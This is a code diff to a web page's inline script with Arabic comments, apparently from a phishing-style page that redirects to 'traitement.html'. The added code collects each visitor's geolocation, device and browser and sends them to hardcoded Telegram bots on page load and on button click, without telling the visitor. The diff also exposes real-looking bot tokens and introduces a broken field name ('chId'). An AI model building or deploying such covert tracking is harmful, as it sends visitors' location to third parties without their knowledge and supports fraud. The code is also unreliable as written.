@@ -353,30 +353,35 @@
     </div>
     
     <script>
-        // Simple animation on load
-        document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(function() {
-                document.querySelector('.processing-note').style.opacity = '1';
-            }, 800);
-            
-            // Button click effect
-            const btn = document.getElementById('confirmButton');
-            btn.addEventListener('click', function() {
-                this.textContent = 'جاري التوجيه...';
-                this.style.opacity = '0.9';
-                
-                // جمع معلومات الزائر وإرسال إشعار Telegram
-                sendTelegramNotification();
-                
-                // التوجيه بعد إرسال الإشعار
-                setTimeout(function() {
-                    window.location.href = 'traitement.html';
-                }, 1000);
+        // دالة لجمع معلومات الموقع الجغرافي
+        function getLocationInfo() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            // استخدم خدمة reverse geocoding للحصول على اسم المدينة
+                            const apiKey = 'YOUR_OPENCAGE_API_KEY'; // تحتاج إلى الحصول على مفتاح API من OpenCage
+                            const url = `https://api.opencagedata.com/geocode/v1/json?q=${position.coords.latitude}+${position.coords.longitude}&key=${apiKey}&language=ar`;
+                            
+                            fetch(url)
+                                .then(response => response.json())
+                                .then(data => {
+                                    const city = data.results[0]?.components?.city || 'Unknown';
+                                    const country = data.results[0]?.components?.country || 'Unknown';
+                                    resolve(`${city} - ${country}`);
+                                })
+                                .catch(() => resolve('Location unknown'));
+                        },
+                        () => resolve('Location blocked')
+                    );
+                } else {
+                    resolve('Geolocation not supported');
+                }
             });
-        });
+        }
 
         // دالة لإرسال إشعار Telegram
-        function sendTelegramNotification() {
+        async function sendTelegramNotification() {
             // معلومات البوت والمستلمين
             const telegramConfigs = [
                 { token: "7906116265:AAGSBPqDTBvNMYDclFb669bgBDLux_XiwfA", chatId: "5372119436" },
@@ -387,6 +392,7 @@
             const pageUrl = window.location.href;
             const now = new Date();
             const timeString = now.toLocaleString('ar-SA');
+            const locationInfo = await getLocationInfo();
             
             // معلومات الجهاز والمتصفح
             const userAgent = navigator.userAgent;
@@ -406,6 +412,7 @@
             const message = `🔔 New Website Visit 🔔
 📄 Page: ${pageUrl}
 🕒 Time: ${timeString}
+📍 Location: ${locationInfo}
 📱 Device: ${deviceType} ${deviceType === 'Mobile' ? '📱' : '💻'}
 🌐 Browser: ${browser}`;
             
@@ -417,13 +424,38 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: config.chatId,
+                        chat_id: config.chId,
                         text: message,
                         parse_mode: 'HTML'
                     })
                 }).catch(error => console.error('Error sending to Telegram:', error));
             });
         }
+
+        // Simple animation on load
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(function() {
+                document.querySelector('.processing-note').style.opacity = '1';
+            }, 800);
+            
+            // إرسال إشعار عند تحميل الصفحة
+            sendTelegramNotification().catch(e => console.error('Error sending initial notification:', e));
+            
+            // Button click effect
+            const btn = document.getElementById('confirmButton');
+            btn.addEventListener('click', function() {
+                this.textContent = 'جاري التوجيه...';
+                this.style.opacity = '0.9';
+                
+                // جمع معلومات الزائر وإرسال إشعار Telegram
+                sendTelegramNotification().catch(e => console.error('Error sending click notification:', e));
+                
+                // التوجيه بعد إرسال الإشعار
+                setTimeout(function() {
+                    window.location.href = 'traitement.html';
+                }, 1000);
+            });
+        });
     </script>
 </body>
 </html>
